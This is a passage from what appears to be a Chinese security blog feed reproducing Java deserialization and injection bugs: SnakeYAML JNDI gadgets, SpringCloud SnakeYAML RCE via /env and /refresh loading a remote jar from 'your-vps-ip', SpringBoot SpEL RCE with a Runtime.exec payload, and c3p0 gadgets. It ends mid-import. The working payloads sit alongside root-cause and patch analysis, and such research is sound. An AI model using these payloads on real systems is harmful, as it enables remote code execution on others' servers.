Configuration</h3><p>引入依赖测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>触发payload是这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;set:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/Exploit\&quot;]]&quot;</span>;</span><br></pre></td></tr></table></figure><p>网上搜了一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? 号： 针对较为复杂的对象格式</span><br></pre></td></tr></table></figure><p>但是在理解了原理以后才知道，搞复杂了，实际上下面这个payload也可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/Exploit\&quot;]]: 1&quot;</span>;</span><br></pre></td></tr></table></figure><p>主要是触发的时候是利用key调用hashCode方法所产生的利用链，还是简单说下调用链吧</p><p>在对ConfigurationMap调用hashCode的时候实际上是执行了,java.util.AbstractMap#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">        h += i.next().hashCode();</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后会调用org.apache.commons.configuration.ConfigurationMap#entrySet的iterator方法，也就是org.apache.commons.configuration.ConfigurationMap.ConfigurationSet#iterator</p><p>之后就可以配合<code>JNDIConfiguration</code>实现jndi注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">getBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)</span><br><span class="line">getKeys:203, JNDIConfiguration (org.apache.commons.configuration)</span><br><span class="line">getKeys:182, JNDIConfiguration (org.apache.commons.configuration)</span><br></pre></td></tr></table></figure><h2 id="探测SnakeYAML"><a href="#探测SnakeYAML" class="headerlink" title="探测SnakeYAML"></a>探测SnakeYAML</h2><p>突然想到一个新的探测payload，之前上面有一个SPI那个链子可以有通过URLClassloader检测 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!java.net.URL [null, \&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\&quot;]: 1&quot;</span>; </span><br></pre></td></tr></table></figure><p>这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析，因此通过构造URL对象后面简单加个: 1让他成为一个mapping</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SnakeYAML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringCloud-SnakeYAML-RCE</title>
      <link href="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/"/>
      <url>/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SpringCloud-SnakeYAML-RCE"><a href="#SpringCloud-SnakeYAML-RCE" class="headerlink" title="SpringCloud-SnakeYAML-RCE"></a>SpringCloud-SnakeYAML-RCE</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Ps：支持/env的post的好像必须要springCloud，springBoot我怎么都不可以搜了网上一堆也不行，有大佬知道可以说说为什么</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>2.准备一个恶意jar，实现SPI，很简单如下</p><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/2.png"></p><p>3.设置 spring.cloud.bootstrap.location 属性</p><p>spring1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure><p>spring2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><p>4.刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/1.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>从过程中我们知道，命令执行是由于 SnakeYAML 在解析 YAML 文件时，存在反序列化漏洞导致，这个在我博客其他文章就有提过了，这里就不再多说</p><p>看几个关键的地方，处理 <code>/refresh</code> 接口请求的类在org.springframework.cloud.endpoint.RefreshEndpoint#refresh</p><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/3.png"></p><p>第二个是 <code>BootstrapApplicationListener.bootstrapServiceContext()</code> 方法，这里从环境变量中获取到了 <code>spring.cloud.bootstrap.location</code> 的值</p><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/4.png"></p><p>最后在 <code>org.springframework.boot.env.PropertySourcesLoader.load()</code> 方法，根据文件名后缀 (yml) ，使用 <code>YamlPropertySourceLoader</code> 类加载 url 对应的 yml 配置文件，因 spring-beans.jar 包含 snakeyaml.jar，因此 <code>YamlPropertySourceLoader</code> 在默认情况下是使用 SnakeYAML 库解析配置</p><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/5.png"></p><p><img src="/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/6.png"></p><h2 id="高版本无效"><a href="#高版本无效" class="headerlink" title="高版本无效"></a>高版本无效</h2><p>在Spring1.x版本当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StandardEnvironment <span class="title">copyEnvironment</span><span class="params">(ConfigurableEnvironment input)</span> </span>&#123;</span><br><span class="line">       StandardEnvironment environment = <span class="keyword">new</span> StandardEnvironment();</span><br><span class="line">       MutablePropertySources capturedPropertySources = environment.getPropertySources();</span><br><span class="line">       Iterator var4 = capturedPropertySources.iterator();</span><br><span class="line"></span><br><span class="line">       PropertySource source;</span><br><span class="line">       <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">           source = (PropertySource)var4.next();</span><br><span class="line">           capturedPropertySources.remove(source.getName());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       var4 = input.getPropertySources().iterator();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">           source = (PropertySource)var4.next();</span><br><span class="line">           capturedPropertySources.addLast(source);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       environment.setActiveProfiles(input.getActiveProfiles());</span><br><span class="line">       environment.setDefaultProfiles(input.getDefaultProfiles());</span><br><span class="line">       Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">       map.put(<span class="string">&quot;spring.jmx.enabled&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">       map.put(<span class="string">&quot;spring.main.sources&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">       capturedPropertySources.addFirst(<span class="keyword">new</span> MapPropertySource(<span class="string">&quot;refreshArgs&quot;</span>, map));</span><br><span class="line">       <span class="keyword">return</span> environment;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在Spring2.x版本当中，却有限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StandardEnvironment <span class="title">copyEnvironment</span><span class="params">(ConfigurableEnvironment input)</span> </span>&#123;</span><br><span class="line">        StandardEnvironment environment = <span class="keyword">new</span> StandardEnvironment();</span><br><span class="line">        MutablePropertySources capturedPropertySources = environment.getPropertySources();</span><br><span class="line">        String[] var4 = DEFAULT_PROPERTY_SOURCES;</span><br><span class="line">        <span class="keyword">int</span> var5 = var4.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">            String name = var4[var6];</span><br><span class="line">            <span class="keyword">if</span> (input.getPropertySources().contains(name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (capturedPropertySources.contains(name)) &#123;</span><br><span class="line">                    capturedPropertySources.replace(name, input.getPropertySources().get(name));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    capturedPropertySources.addLast(input.getPropertySources().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        environment.setActiveProfiles(input.getActiveProfiles());</span><br><span class="line">        environment.setDefaultProfiles(input.getDefaultProfiles());</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">&quot;spring.jmx.enabled&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">        map.put(<span class="string">&quot;spring.main.sources&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;spring.main.web-application-type&quot;</span>, <span class="string">&quot;NONE&quot;</span>);</span><br><span class="line">        capturedPropertySources.addFirst(<span class="keyword">new</span> MapPropertySource(<span class="string">&quot;refreshArgs&quot;</span>, map));</span><br><span class="line">        <span class="keyword">return</span> environment;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>必须在DEFAULT_PROPERTY_SOURCES当中的才能被添加到propertySourceList，而恰好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_PROPERTY_SOURCES = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;commandLineArgs&quot;</span>, <span class="string">&quot;defaultProperties&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>Spring Boot 2.x 无法利用成功</li><li>Spring Boot 1.5.x 在使用 <code>Dalston</code> 版本时可利用成功，使用 <code>Edgware</code> 无法成功</li><li>Spring Boot &lt;= 1.4 可利用成功</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SnakeYAML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低版本SpringBoot-SpEL表达式注入漏洞复现分析</title>
      <link href="/2022/02/07/year/2022/2/%E4%BD%8E%E7%89%88%E6%9C%ACSpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
      <url>/2022/02/07/year/2022/2/%E4%BD%8E%E7%89%88%E6%9C%ACSpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="低版本SpringBoot-SpEL表达式注入漏洞复现分析"><a href="#低版本SpringBoot-SpEL表达式注入漏洞复现分析" class="headerlink" title="低版本SpringBoot-SpEL表达式注入漏洞复现分析"></a>低版本SpringBoot-SpEL表达式注入漏洞复现分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>SpringBoot 1.1.0-1.1.12<br>SpringBoot 1.2.0-1.2.7<br>SpringBoot 1.3.0</p><p>利用条件是使用了springboot的默认错误页(Whitelabel Error Page)，漏洞点在：<code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code></p><h2 id="触发原因"><a href="#触发原因" class="headerlink" title="触发原因"></a>触发原因</h2><p>在SpringBoot的自定义错误页面，功能是页面返回错误，并提供详细信息，信息中包括错误status（”status”-&gt;500）、时间戳（”timestamp”-&gt;”Fri Dec…..”）、错误信息（”error”-&gt;”Internal Server Error”）、和用户输入的参数（”message”-&gt;”abcd”），这些参数在模板文件中以类似于以下形式存在：”Error 1234 ${status}—${timestamp}—${error}—${message}“。</p><blockquote><p>关于漏洞的原理：</p><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol></blockquote><p>但主要的原因在于这里使用了递归，也就是说如果参数名中还包含${和}的话，这个解析引擎会再次递归一次，再次解析这个值，如，模板中有个值为${${abc}}，由于使用了递归，解析引擎会对其解析两次，第一层去掉最外层的{}解析成${abc}，然后将其作为参数进行第二次解析。在第二次解析中将里层的{}去掉，变成abc</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>简简单单写个抛出异常的控制器即可，这里访问下面这个url，页面当中就会出现36</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/?test=$&#123;6*6&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">abc</span><span class="params">(HttpServletRequest request)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入正题，在<code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code></p><p>首先会提取出<code>$&#123;&#125;</code>当中的内容，这里第一个是从模板里取出的所以只能是<code>timestamp</code>\<code>error</code>\<code>status</code>\<code>message</code></p><p><img src="/2022/02/07/year/2022/2/%E4%BD%8E%E7%89%88%E6%9C%ACSpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/2.png"></p><p>以timestamp为例子，这里在得到SpEL解析的结果后下面还会再对这个值继续进行SpEL表达式解析，很骚，调用的是parseStringValue，也就是一个递归的过程因此造成了SpEL的递归解析因此最终导致漏洞的产生，知道这个过程以后我们甚至可以让payload变得更难被探测，比如<code>$&#123;$&#123;1*2&#125;*6&#125;</code>会返回12</p><p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure><p>这里执行<code>open -na Calculator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>补丁创建了一个新的NonRecursivePropertyPlaceholderHelper类，用于防止parseStringValue进行递归解析</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/ce4ac733a4b9">https://www.jianshu.com/p/ce4ac733a4b9</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SpEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c3p0的三个gadget的学习</title>
      <link href="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="c3p0的三个gadget的学习"><a href="#c3p0的三个gadget的学习" class="headerlink" title="c3p0的三个gadget的学习"></a>c3p0的三个gadget的学习</h1><p>目前c3p0有三种方式getshell</p><ul><li>加载远程类</li><li>jndi</li><li>hex序列化字节加载器</li></ul><p>前两个可以放在一起学习,在com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject，可以看到，如果是IndirectlySerialized的实例就会去调用getObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">    o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而它的实现类只有一个com.mchange.v2.naming.ReferenceIndirector.ReferenceSerialized，我们可以看看</p><p><img src="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png"></p><h2 id="触发jndi"><a href="#触发jndi" class="headerlink" title="触发jndi"></a>触发jndi</h2><p>很明显如果contextName不为空，则会触发，这里没必要继续说下去了</p><h2 id="加载远程类"><a href="#加载远程类" class="headerlink" title="加载远程类"></a>加载远程类</h2><p>接下来是第二个，这也是ysoserial本身集成的一个payload，继续往下看，ReferenceableUtils.referenceToObject，也是很明显通过URLClassloader加载远程类，并且默认初始化了，因此可以直接在静态块里面放入恶意数据</p><p><img src="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png"></p><p>关于writeObject的话，以ysoserial的为例，PoolSource implements ConnectionPoolDataSource, Referenceable，只要不实现序列化接口，并实现getReference方法返回我们的Reference对象即可，也是很简单的</p><h2 id="hex序列化字节加载器"><a href="#hex序列化字节加载器" class="headerlink" title="hex序列化字节加载器"></a>hex序列化字节加载器</h2><p>这个更多会用到在fastjson，Snake YAML , JYAML,Yamlbeans , Jackson,Blazeds,Red5, Castor等里面配合使用</p><p>当在userOverridesAsString当中设置了序列化数据后，当调用set方法setUpPropertyListeners时就能触发，而这个监听器正好在设置完userOverridesAsString就会调用</p><p><img src="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png"></p><p><img src="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png"></p><p>可以看到里面对序列化数据的处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">parseUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (userOverridesAsString != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String hexAscii = userOverridesAsString.substring(<span class="string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] serBytes = ByteUtils.fromHexAscii(hexAscii);</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后触发原生反序列化</p><p><img src="/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png"></p><p>后面才发现又个地方比较坑，在com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String hexAscii = userOverridesAsString.substring(<span class="string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里会把最后一位吃了有点恶心，因此构造payload的时候要像这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">&quot;HexAsciiSerializedMap:&quot;</span>+HexString+<span class="string">&quot;:&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里给个demo方便测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.govuln.deserialization.CB1;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> hudson.remoting.Base64;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> 